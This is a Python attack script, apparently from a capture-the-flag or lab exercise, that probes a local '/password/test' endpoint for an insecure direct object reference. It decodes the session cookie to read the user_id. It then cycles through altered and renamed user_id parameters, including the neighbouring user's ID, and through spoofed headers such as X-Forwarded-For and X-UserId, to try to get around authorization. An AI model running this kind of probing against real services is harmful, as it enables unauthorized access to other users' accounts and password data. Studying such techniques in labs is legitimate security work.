#!/usr/bin/env python3
"""
Systematic parameter testing for /password/test endpoint
Testing parameter names, values, and checking response content for hidden data
"""

import requests
import json
import base64

# Configuration
BASE_URL = "http://127.0.0.1:33200/password/test"
COOKIE = {"session": "eyJ1c2VyX2lkIjoxMDAzMn0.aVfTUQ.G8of8DB4VyuHWQyIuFLZdoZkdiI"}

# Extract user_id from session cookie
session_cookie = COOKIE["session"]
parts = session_cookie.split('.')
if len(parts) >= 1:
    # Add padding if needed for base64
    payload_b64 = parts[0]
    padding = 4 - (len(payload_b64) % 4)
    if padding != 4:
        payload_b64 += '=' * padding
    
    decoded = base64.b64decode(payload_b64)
    session_data = json.loads(decoded)
    current_user_id = session_data.get("user_id", "unknown")
    print(f"Current session user_id: {current_user_id}")
else:
    current_user_id = "unknown"

print("=" * 80)
print("DETAILED PARAMETER ANALYSIS - /password/test")
print("=" * 80)
print(f"Base URL: {BASE_URL}")
print(f"Session Cookie: {COOKIE}")
print(f"Decoded user_id from session: {current_user_id}")
print("=" * 80)

# Get full response with current valid user_id
print(f"\n[+] Getting full baseline response with our user_id...")
baseline = requests.get(
    BASE_URL,
    cookies=COOKIE,
    params={"user_id": str(current_user_id)},
    timeout=5
)

print(f"Status: {baseline.status_code}")
print(f"Length: {len(baseline.text)}")
print(f"\n[+] Full response headers:")
for key, value in baseline.headers.items():
    print(f"  {key}: {value}")

print(f"\n[+] First 500 chars of response:")
print(baseline.text[:500])

# Check for hidden content patterns
print(f"\n[+] Searching response for hidden patterns...")
if "hidden" in baseline.text.lower():
    print("  [!] Found 'hidden' text in response")
    
if "input type=\"hidden\"" in baseline.text:
    print("  [!] Found hidden input fields")
    # Extract hidden fields
    import re
    hidden_fields = re.findall(r'<input[^>]*type=\"hidden\"[^>]*>', baseline.text)
    for field in hidden_fields:
        print(f"    {field}")

# Test parameter variations that might reveal other users
print(f"\n[+] Testing different parameter approaches...")

# Try user_id variations
param_tests = [
    {"user_id": str(current_user_id)},
    {f"user_id": str(current_user_id - 1)},
    {"userid": str(current_user_id)},
    {"id": str(current_user_id)},
    {"userId": str(current_user_id)},
    {"uid": str(current_user_id)},
    {"user_id[]": str(current_user_id)},  # Array format
]

print(f"\nTesting different parameter formats:")
for i, params in enumerate(param_tests[:5]):  # Test first 5
    response = requests.get(BASE_URL, cookies=COOKIE, params=params, timeout=5)
    print(f"  Test {i+1} ({list(params.keys())[0]}): Status={response.status_code}, Length={len(response.text)}")
    if len(response.text) != len(baseline.text):
        print(f"    [!] Different response length! Exploring...")
        print(f"    First 200 chars: {response.text[:200]}")

# Test headers that might influence behavior
print(f"\n[+] Testing additional headers that might affect authorization...")

header_tests = [
    {"X-UserId": str(current_user_id)},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-UserId": str(current_user_id)},
]

for headers in header_tests:
    all_headers = {**headers, "User-Agent": "Security-Test-Agent"}
    response = requests.get(
        BASE_URL,
        cookies=COOKIE,
        headers=all_headers,
        params={"user_id": str(current_user_id)},
        timeout=5
    )
    print(f"  With {list(headers.keys())[0]}: Status={response.status_code}")

print("\n" + "=" * 80)
print("ANALYSIS COMPLETE")
print("=" * 80)
